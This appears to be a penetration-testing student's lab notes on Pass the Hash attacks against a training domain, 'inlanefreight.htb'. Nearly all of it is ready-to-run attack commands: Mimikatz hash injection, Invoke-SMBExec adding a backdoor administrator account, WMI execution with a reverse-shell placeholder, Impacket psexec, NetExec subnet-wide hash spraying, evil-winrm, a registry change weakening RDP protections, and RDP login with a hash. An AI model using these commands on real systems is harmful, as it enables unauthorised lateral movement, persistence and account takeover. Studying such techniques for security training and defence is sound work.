Let's assume we obtain the password hash (`64F12CDDAA88057E06A81B54E73B949B`) for the account `julio` from the domain `inlanefreight.htb`. Let's see how we can perform Pass the Hash attacks from Windows and Linux machines.

# NTLM

## Pass the Hash with Mimikatz (Windows)

Mimikatz has a module named `sekurlsa::pth` that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.

```sh
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

## Pass the Hash with PowerShell Invoke-TheHash (Windows)

This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer

When using `Invoke-TheHash`, we have two options: SMB or WMI command execution.

#### Invoke-TheHash with SMB

```powershell
cd C:\tools\Invoke-TheHash\

Import-Module .\Invoke-TheHash.psd1

Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```


> [!NOTE] 
> we can also use a Powershell reverse shell

#### Invoke-TheHash with WMI

```powershell-session
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<ANY PS REVERSE PAYLOAD"

[+] Command executed with process id 520 on DC01
```


## Pass the Hash with Impacket (Linux)

#### Pass the Hash with Impacket PsExec

```shell
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

## Pass the Hash with NetExec (Linux)

#### Pass the Hash with NetExec

```shell
 netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

if we want to perform the same actions but attempt to authenticate to each host in a subnet using the local administrator password hash, we could add `--local-auth` to our command. This method is helpful if we obtain a local administrator hash by dumping the local SAM database on one host and want to check how many (if any) other hosts we can access due to local admin password re-use. If we see `Pwn3d!`, it means that the user is a local administrator on the target computer.

#### NetExec - Command Execution

```shell 
 netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## Pass the Hash with evil-winrm (Linux)
If SMB is blocked or we don't have administrative rights, we can use this alternative protocol to connect to the target machine.

#### Pass the Hash with evil-winrm

```shell
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

**Note:** When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb

## Pass the Hash with RDP (Linux)

There are a few caveats to this attack:
1. - `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with the following error:
![[Pasted image 20250717085600.png]]
2. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### Pass the Hash using RDP

```shell
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

## UAC limits Pass the Hash for local accounts

UAC (User Account Control) limits local users' ability to perform remote administration operations. When the registry key `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to 0, it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed to perform remote administration tasks. Setting it to 1 allows the other local admins as well.

> **Note:** There is one exception, if the registry key `FilterAdministratorToken` (disabled by default) is enabled (value 1), the RID 500 account (even if it is renamed) is enrolled in UAC protection. This means that remote PTH will fail against the machine when using that account.


These settings are only for local administrative accounts. If we get access to a domain account with administrative rights on a computer, we can still use Pass the Hash with that computer.
